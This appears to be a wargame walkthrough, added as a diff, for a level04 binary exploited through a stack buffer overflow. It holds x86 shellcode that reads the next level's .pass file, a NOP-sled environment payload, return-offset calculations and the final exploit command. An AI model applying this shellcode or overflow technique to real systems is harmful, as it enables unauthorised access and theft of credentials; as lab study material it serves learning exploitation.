@@ -1,0 +1,17 @@
+- we can overflow str in order to reach main return address
+- gets is run however in another process wich will return without letting us interact with our exploit shell
+
+- so we have to modify our usual shellcode in order to open, read and write the target .pass file directly into stdout
+
+- export EXPLOIT=$(ruby -e 'print "\x90" * 128 +
+"\x31\xc0\xb0\x05\x6a\x73\x68\x2e\x70\x61\x73\x68\x6c\x30\x35\x2f\x68\x6c\x65\x76\x65\x68\x65\x72\x73\x2f\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\x8d\x1c\x24\x31\xc9\x31\xd2\xcd\x80\x89\xc3\x31\xc0\xb0\x03\x83\xec\x28\x8d\x0c\x24\x31\xd2\xb2\x28\xcd\x80\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x8d\x0c\x24\x31\xd2\xb2\x28\xcd\x80"
+
+- env_checker EXPLOIT 128 = 0xffffd85a 
+
+- finally we calculate the return address offset
+	- esp @ 0xb0(frame begin) - str @ 0x20(%esp) = 144 bytes from str to frame beginning
+	- 144 + 8 bytes for the 2 saved registers (no stack alignment in gdb) = 152 bytes until ebp
+	- 152 + 4 = 156 bytes to reach the main return address
+
+- we can build our exploit command
+	- ruby -e 'print "x" * 156 + "\x5a\xd8\xff\xff"' | ./level04
